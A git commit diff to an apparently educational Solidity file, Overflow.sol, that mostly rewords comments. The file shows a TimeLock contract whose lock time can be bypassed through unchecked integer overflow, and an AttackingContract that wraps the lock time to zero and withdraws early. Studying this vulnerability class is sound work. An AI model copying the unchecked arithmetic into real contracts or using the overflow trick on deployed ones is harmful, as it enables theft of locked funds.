21f6b5a965e103406f10778a9367a61aec59faa1
Thomas Saudemont <65908739+thomas192@users.noreply.github.com>
2022-01-04 19:45:59 -0500

    force ether

--- Overflow.sol
+++ Overflow.sol
@@ -1,7 +1,7 @@
 pragma solidity ^0.6.6;
 
 // Here we are using uint overflow to bypass the lock time
-// of funds deposited on a contract.
+// of funds deposited in a contract.
 
 // eth deposited on this contract are locked for a period of time
 contract TimeLock {
@@ -22,14 +22,14 @@ contract TimeLock {
         lockTime[msg.sender] += _secondToIncrease;
     }
 
-    // withdraw all the funds deposited if the lock time has expired
+    // withdraw the funds deposited
     function withdraw() public {
+        // ensure the caller has funds to withdraw
         require(balances[msg.sender] > 0, "Insufficient funds");
+        // ensure the lock time has expired
         require(now > lockTime[msg.sender], "Lock time not expired");
-
         uint amount = balances[msg.sender];
         balances[msg.sender] = 0;
-
         (bool success,) = msg.sender.call{value: amount}("");
         require(success, "Failed to send eth");
     }
@@ -46,11 +46,12 @@ contract AttackingContract {
 
     function attack() public payable {
         timeLock.deposit{value: msg.value}();
-        // t == current lock time
-        // find x such that 
-        // x + t = 2**256
-        // x = 2**256 - t
+        // set the lock time to 0
         timeLock.increaseLockTime(
+            // t == current lock time
+            // find x such that 
+            // x + t = 2**256
+            // x = 2**256 - t
             uint(-timeLock.lockTime(address(this)))
         );
         timeLock.withdraw();
